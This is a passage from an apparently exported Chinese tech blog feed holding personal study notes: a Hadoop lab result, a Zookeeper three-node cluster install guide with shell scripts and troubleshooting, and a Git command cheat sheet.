/jinguo/shuguo.txt</span><br></pre></td></tr></table></figure>

<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>通过web端可以查看到创建的文件夹：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106739.png" alt="image-20210630143235900"></p>
<p>这个也可以shuguo.txt的副本数为10:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106740.png" alt="image-20210630143324158"></p>
<p>文件信息：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106741.png" alt="image-20210630143802614"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><h3 id="Hadoop102-9870-访问不了"><a href="#Hadoop102-9870-访问不了" class="headerlink" title="Hadoop102:9870 访问不了"></a>Hadoop102:9870 访问不了</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106742.png" alt="image-20210630144104874"></p>
<p>反复排查后，发现主机mac上的hosts设置错了，倒是hadoop102对应的ip找不到。</p>
<p>解决方案：</p>
<p>重新设置hosts即可</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Zookeeper</title>
    <url>/2021/12/21/%E5%A4%A7%E6%95%B0%E6%8D%AE/Zookeeper/</url>
    <content><![CDATA[<h1 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h1><ul>
<li><p>zookeeper&#x3D;文件系统+通知机制</p>
</li>
<li><p>一个leader多个follower组成的集群</p>
</li>
<li><p>集群只要半数以上节点存活，Zookeeper集群就能正常服务，适合安装奇数台服务器，偶数会浪费</p>
</li>
<li><p>全局数据一致:每个Server保存一份相同的数据副本，Client无论连接到哪个Server，数据都是一致的。 </p>
</li>
<li><p>更新请求顺序执行，来自同一个Client的更新请求按其发送顺序依次执行。 </p>
</li>
<li><p>数据更新原子性，一次数据更新要么成功，要么失败。 </p>
</li>
<li><p>实时性，在一定时间范围内，Client能读到最新数据。</p>
</li>
</ul>
<p>每一个 ZNode 默认能够存储 1MB 的数据，每个 ZNode 都可以通过 其路径唯一标识。</p>
<h2 id="Zookeeper本地安装"><a href="#Zookeeper本地安装" class="headerlink" title="Zookeeper本地安装"></a>Zookeeper本地安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[hmw@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop100</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">创建huang用户</span></span><br><span class="line">[hmw@hadoop100 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop100 ~]$ passwd huang</span><br><span class="line"><span class="meta">#</span><span class="language-bash">root和hmw密码hmw，huang密码yc</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置hmw用户具有root权限</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在%wheel  ALL=(ALL) ALL这行下面添加一行</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了huang具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以huang要放到%wheel这行下面。</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看这两个文件的所有者和所有属组</span></span><br><span class="line">[hmw@hadoop100 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop100 ~]$ ll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">卸载虚拟机自带的JDK</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm-qa:查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep -i:忽略大小写</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">xargs -n1:表示每次只传递一个参数</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm -e –nodeps:强制卸载软件</span></span><br><span class="line">[hmw@hadoop100 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">[hmw@hadoop100 ~]$ reboot</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改hostname</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改hosts</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hosts</span><br><span class="line">10.211.55.13 hadoop102</span><br><span class="line">10.211.55.14 hadoop103</span><br><span class="line">10.211.55.15 hadoop104</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置免密登录</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1. 判断参数个数</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta">	#</span><span class="language-bash">3. 遍历所有目录，挨个发送</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">4. 判断文件是否存在</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. 获取父目录</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. 获取当前文件的名称 </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改脚本xsync具有执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">[huang@hadoop100 ~]$ reboot</span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装jdk</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果用了sudo，那么xsync一定要给它的路径补全</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line">sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">/是指根目录：就是所有目录最顶层的目录。</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">./表示当前目录，./ 一般需要和其他文件夹或者文件结合使用，指代当前目录下的东西。</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让新的环境变量生效</span></span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装Zookeeper</span></span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">/tmp 目录存的是临时数据，一个月可能会被删除</span></span><br><span class="line">mkdir zkData</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在/opt/module/zookeeper-3.5.7/zkData 目录下创建一个 myid 的文件</span></span><br><span class="line">vi myid</span><br><span class="line">2</span><br><span class="line"><span class="meta">#</span><span class="language-bash">同步，并分别在 hadoop103、hadoop104 上修改 myid 文件中内容为 3、4</span></span><br><span class="line">xsync zookeeper-3.5.7</span><br><span class="line"></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">vim zoo.cfg</span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">######################cluster########################## server.2=hadoop102:2888:3888</span></span></span><br><span class="line">server.3=hadoop103:2888:3888</span><br><span class="line">server.4=hadoop104:2888:3888</span><br><span class="line"></span><br><span class="line">xsync zoo.cfg</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动（3台都要启动）</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">编写启动停止脚本</span></span><br><span class="line">vim zk.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i 启动 ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh start&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i 停止 ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">&quot;status&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i 状态 ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh status&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">chmod u+x zk.sh</span><br><span class="line">zk.sh start</span><br><span class="line">zk.sh stop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">jpsall脚本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="选举机制"><a href="#选举机制" class="headerlink" title="选举机制"></a>选举机制</h2><p>应答数超过半数就是回复成功</p>
<h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>CountDownLatch 应用场景</p>
<p>典型的应用场景就是当一个服务启动时，同时会加载很多组件和服务，这时候主线程会等待组件和服务的加载。当所有的组件和服务都加载完毕后，主线程和其他线程在一起完成某个任务。</p>
<p>CountDownLatch 还可以实现学生一起比赛跑步的程序，CountDownLatch 初始化为学生数量的线程，鸣枪后，每个学生就是一条线程，来完成各自的任务，当第一个学生跑完全程后，CountDownLatch 就会减一，直到所有的学生完成后，CountDownLatch 会变为 0 ，接下来再一起宣布跑步成绩。</p>
<h4 id="Curator分布式锁框架"><a href="#Curator分布式锁框架" class="headerlink" title="Curator分布式锁框架"></a>Curator分布式锁框架</h4><h2 id="Paxos算法"><a href="#Paxos算法" class="headerlink" title="Paxos算法"></a>Paxos算法</h2><h2 id="Zab算法"><a href="#Zab算法" class="headerlink" title="Zab算法"></a>Zab算法</h2><ul>
<li><strong>序列化</strong>：把Java对象转换为字节序列。</li>
<li><strong>反序列化</strong>：把字节序列恢复为原先的Java对象。</li>
</ul>
<p>会存在本地磁盘</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>启动zookeeper时，感觉一切正常，但是通过zkServer.sh status查看状态时，发现报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error contacting service. It is probably not running.</span><br></pre></td></tr></table></figure>

<p>通过查看 zk&#x2F;logs下的文件，发现有如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERROR [main:QuorumPeerMain@86] - Invalid config, exiting abnormally</span><br><span class="line">org.apache.zookeeper.server.quorum.QuorumPeerConfig$ConfigException: Address unresolved: node01:3888 </span><br><span class="line">	at org.apache.zookeeper.server.quorum.QuorumPeer$QuorumServer.&lt;init&gt;(QuorumPeer.java:242)</span><br><span class="line">	at org.apache.zookeeper.server.quorum.flexible.QuorumMaj.&lt;init&gt;(QuorumMaj.java:89)</span><br></pre></td></tr></table></figure>

<h2 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h2><p>在配置zoo.cfg文件时候，端口号后面还有空格。因为是从其他地方复制的，所以不容易发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.0=spark1:2888:3888(此处有空格)</span><br><span class="line">server.1=spark2:2888:3888</span><br><span class="line">server.2=spark3:2888:3888</span><br></pre></td></tr></table></figure>

<h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p>删掉端口号后面的空格即可</p>
<p>有问题一定要先看日志</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>常用命令</title>
    <url>/2021/12/21/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><p><a href="https://learngitbranching.js.org/?locale=zh_CN">Git学习网站</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">将本地项目推送到github</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;init commit&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">将本地项目与远程仓库关联</span></span><br><span class="line">git remote add origin https://github.com/HuangMingwang/test.git</span><br><span class="line"><span class="meta"># </span><span class="language-bash">第一次提交需要-u，该-u标志添加了对您推送到的上游服务器的跟踪引用。</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">一旦你做了一个git push -u origin master，你可以稍后调用git pull，git 就会知道你实际上是指git pull origin master.</span></span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看远程仓库地址</span></span><br><span class="line">git remote -v</span><br><span class="line"><span class="meta"># </span><span class="language-bash">http 与ssh互转</span></span><br><span class="line">git remote set-url origin https://xxxxxxx.git</span><br><span class="line">git remote set-url origin git@git.xxxxx.git</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">创建一个新的版本库</span></span><br><span class="line">git clone https://git.woa.com/mingwhuang/mybatisplus-demo.git</span><br><span class="line">cd mybatisplus-demo</span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;add README&quot;</span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">切换分支</span></span><br><span class="line">git checkout -b test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看历史</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">使用merge合并</span></span><br><span class="line">git merge test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">使用rebase合并</span></span><br><span class="line">git checkout test</span><br><span class="line">git merge test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">打tag</span></span><br><span class="line">git tag v1.0</span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看tag</span></span><br><span class="line">git tag</span><br><span class="line">git push origin v1.0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">回退暂存区的内容到上一个版本，已经add的会变成没有add的状态，工作区内容不变</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">HEAD^ 上一个版本</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">HEAD^^ 上上一个版本</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">HEAD^^^ 上上上一个版本</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">这个命令仅改变暂存区，并不改变工作区，这意味着在无任何其他操作的情况下，工作区中的实际文件同该命令运行之前无任何变化</span></span><br><span class="line">git reset HEAD^  </span><br><span class="line"><span class="meta"># </span><span class="language-bash">回退hello.php 文件的版本到上一个版本</span>  </span><br><span class="line">git reset HEAD^ hello.php  </span><br><span class="line"><span class="meta"># </span><span class="language-bash">回退到指定版本</span></span><br><span class="line">git reset 052e(哈希值) </span><br><span class="line"><span class="meta"># </span><span class="language-bash">往前回退一个版本，并且将这次错误的提交的代码改动，放在工作区里。（和不带参数是一样的）</span></span><br><span class="line">git reset --mixed HEAD^</span><br><span class="line"><span class="meta"># </span><span class="language-bash">工作区：即自己当前分支所修改的代码，git add xx 之前的！不包括 git add xx 和 git commit xxx 之后的。</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">返回到某个节点，回退完了后工作区就是上一个版本的代码了，并且是clean的，只会回退已经add到文件缓存区（暂存区）的内容（包括新增的文件）</span></span><br><span class="line">git reset --hard HASH</span><br><span class="line"><span class="meta"># </span><span class="language-bash">往前回退一个版本，并且将这次错误的提交的代码改动，放在暂存区里。</span></span><br><span class="line">git reset --soft HASH </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">撤销对所有已修改并且已经add到暂存区但未提交的文件的修改，但不包括新增的文件,新增的文件内容都不会变</span></span><br><span class="line">git checkout .</span><br><span class="line"><span class="meta"># </span><span class="language-bash">撤销对指定文件的修改，[filename]为文件名</span></span><br><span class="line">git checkout [filename] </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">是一次clean的演习, 告诉你哪些文件会被删除. 记住他不会真正的删除文件, 只是一个提醒</span></span><br><span class="line">git clean -n</span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除当前目录下所有没有track过的文件，不会删除新建的文件里面的文件，他不会删除.gitignore文件里面指定的文件夹和文件, 不管这些文件有没有被track过</span></span><br><span class="line">git clean -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除指定路径下的没有被track过的文件,当前文件夹如果是新建的也一起会删除</span></span><br><span class="line">git clean -f &lt;path&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除当前目录下没有被track过的文件和文件夹，例如没有add到暂存区的文件和文件夹</span></span><br><span class="line">git clean -df</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除当前目录下所有没有track过的文件. 不管他是否是.gitignore文件里面指定的文件夹和文件</span></span><br><span class="line">git clean -xf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">git reset --hard和git clean -f是一对好基友. 结合使用他们能让你的工作目录完全回退到最近一次commit的时候</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">git clean对于刚编译过的项目也非常有用. 如, 他能轻易删除掉编译后生成的.o和.exe等文件. 这个在打包要发布一个release的时候非常有用</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">下面的例子要删除所有工作目录下面的修改, 包括新添加的文件. 假设你已经提交了一些快照了, 而且做了一些新的开发</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">运行后, 工作目录和缓存区回到最近一次commit时候一摸一样的状态，git status会告诉你这是一个干净的工作目录, 又是一个新的开始了！</span></span><br><span class="line">git reset --hard &amp;&amp; git clean -df</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除当前commit里的.idea文件夹</span></span><br><span class="line">git rm -rf .idea</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">设置git gc周期</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">是一个被删除的提交会在删除30天后，且运行 git gc 以后，被永久丢弃</span></span><br><span class="line">git config gc.pruneexpire &quot;30 days&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">在这种情况下提交将只在你手工运行 git gc 的情况下才永久删除。</span></span><br><span class="line">git config gc.auto 0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">找回丢失的commit</span></span><br><span class="line">git fsck --lost-found</span><br><span class="line">git show &lt;HASH&gt;</span><br><span class="line">git merge</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">git squash用法</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">先checkout master分支并做本地分支和远程仓库同步</span></span><br><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line"><span class="meta"># </span><span class="language-bash">切换到开发分支，并执行commits合并操作</span></span><br><span class="line">git checkout feature/mingwhuang_123123</span><br><span class="line">git rebase -i master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">中止abort</span></span><br><span class="line">git rebase --abort</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">主干开发，每次pull之前执行以下命令</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">先checkout master分支并做本地分支和远程仓库同步</span></span><br><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line"><span class="meta"># </span><span class="language-bash">切换到开发分支，并执行rebase操作</span></span><br><span class="line">git checkout &#123;分支名&#125;</span><br><span class="line">git rebase master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">然后再将开发分支push到远程仓库</span></span><br><span class="line">git pull</span><br><span class="line"><span class="meta"># </span><span class="language-bash">如果rebase出现问题，可以使用这个命令中止rebase</span></span><br><span class="line">git rebase --abort</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">commit规范</span></span><br><span class="line">feat：新功能（feature）</span><br><span class="line">fix：修补bug</span><br><span class="line">docs：文档（documentation）</span><br><span class="line">style： 格式（不影响代码运行的变动）</span><br><span class="line">refactor：重构（即不是新增功能，也不是修改bug的代码变动）</span><br><span class="line">test：增加测试</span><br><span class="line">chore：构建过程或辅助工具的变动</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Git全局设置</span></span><br><span class="line">git config --global user.name  &quot;mingwhuang&quot;</span><br><span class="line">git config --global user.email &quot;mingwhuang@tencent.com&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除指定的远程仓库</span></span><br><span class="line">git remote rm origin</span><br><span class="line"><span class="meta"># </span><span class="language-bash">master分支不能drop commit, 本地分支上的commit也不能删除，但是直接删掉分支所有的commit都处于丢失的commit</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">master出现了分叉，怎么处理</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">先新建分支再cherypick，然后再将原来的master改名，再将新分支push -f上去</span></span><br><span class="line">git cherry-pick 多个hash值</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">用一次新的commit来回滚之前的commit，此次提交之前的commit都会被保留</span></span><br><span class="line">git revert</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">文件被修改了，但未执行git add操作(working tree内撤销)</span></span><br><span class="line">git checkout fileName</span><br><span class="line">git checkout .</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">同时对多个文件执行了git add操作，但本次只想提交其中一部分文件</span></span><br><span class="line">git add *</span><br><span class="line">git status</span><br><span class="line"><span class="meta"># </span><span class="language-bash">取消暂存</span></span><br><span class="line">git reset HEAD</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">文件执行了git add操作，但想撤销对其的修改（index内回滚）</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">取消暂存</span></span><br><span class="line">git reset HEAD fileName</span><br><span class="line"><span class="meta"># </span><span class="language-bash">撤销修改</span></span><br><span class="line">git checkout fileName</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改的文件已被git commit，但想再次修改不再产生新的Commit</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改最后一次提交</span></span><br><span class="line">git add sample.txt</span><br><span class="line">git commit --amend -m&quot;说明&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">已在本地进行了多次git commit操作，现在想撤销到其中某次Commit</span></span><br><span class="line">git reset [--hard|soft|mixed|merge|keep] [commit|HEAD]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">情况一：撤销指定文件到指定版本</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查看指定文件的历史版本</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta"># </span><span class="language-bash">回滚到指定commitID</span></span><br><span class="line">git checkout</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">情况二：删除最后一次远程提交</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">方式一：使用revert</span></span><br><span class="line">git revert HEAD</span><br><span class="line">git push origin master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">方式二：使用reset</span></span><br><span class="line">git reset --hard HEAD^</span><br><span class="line">git push origin master -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">二者区别：</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">revert是放弃指定提交的修改，但是会生成一次新的提交，需要填写提交注释，以前的历史记录都在；</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">reset是指将HEAD指针指到指定提交，历史记录中不会出现放弃的提交记录。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">情况三：回滚某次提交</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">找到要回滚的commitID</span></span><br><span class="line">git log</span><br><span class="line">git revert commitID</span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除某次提交</span></span><br><span class="line">git log --online -n5</span><br></pre></td></tr></table></figure>

